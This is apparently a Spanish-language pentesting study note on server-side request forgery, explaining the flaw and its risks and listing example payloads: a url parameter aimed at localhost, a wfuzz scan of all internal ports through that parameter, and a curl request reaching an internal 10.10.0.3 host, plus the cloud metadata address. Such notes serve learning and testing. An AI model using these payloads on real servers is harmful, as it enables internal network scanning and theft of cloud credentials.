# Server-Side Request Forgery (SSRF)

Tags: #SSRF #OWASP #Explotacion #PHP 

La vulnerabilidad **Server-Side Request Forgery (SSRF)** ocurre cuando un atacante logra que un **servidor web realice solicitudes HTTP en su nombre**, normalmente hacia recursos que el atacante no podría alcanzar directamente.

### Funcionamiento

1. El atacante controla un parámetro de entrada (ej. **URL**, campo de formulario).
2. El servidor procesa esa entrada y genera una solicitud HTTP.
3. El atacante redirige esa solicitud hacia:
    - **Servicios internos** (inaccesibles desde fuera).
    - **Recursos sensibles** como metadata de la nube (`169.254.169.254` en AWS).
    - Otros servidores vulnerables en la **red interna**.

### Riesgos

- Exposición de **credenciales, API keys o contraseñas**.
- Escaneo de **puertos internos** y mapeo de red.
- Posible **RCE** dependiendo del servicio alcanzado.

### Diferencia clave con CSRF

- **SSRF**: la petición la hace el **servidor**, sin intervención del usuario.
- **CSRF**: requiere engañar al **usuario** para ejecutar una acción en su sesión.

## SSRF 

```bash 
❯ http://IP/utility.php?url=http://google.es       # Redirección a otra web  

Notas:
	1. El parámetro mas común es el '?url'
```

## SSRF Caso 1 (Desde el localhost)

```bash 
# Apuntar desde la máquina víctima a su propio 'localhost' para mirar servicios internos
❯ http://IP/utility.php?url=http://localhost 
```

```bash 
# Enumerar puertos abiertos en la máquina víctima 
❯ wfuzz -c --hl=3 -t 100 -z range,1-65535 "http://IP/utility.php?url=http://localhost:FUZZ" 

	# hl = Esconder las palabras con un número total de lineas 
```

## SSRF Caso 2 (Desde otra interfaz interna)

```bash 
# Apuntar a la IP de la máquina víctima para cargar contenido que no esta expuesto al exterior de una web alojada en una máquina de una red interna
❯ curl "http://IP/utility.php?url=http://10.10.0.3:8089/"

Notas:
	1. Se necesita tener acceso a la máquina víctima para mirar sus interfases
```



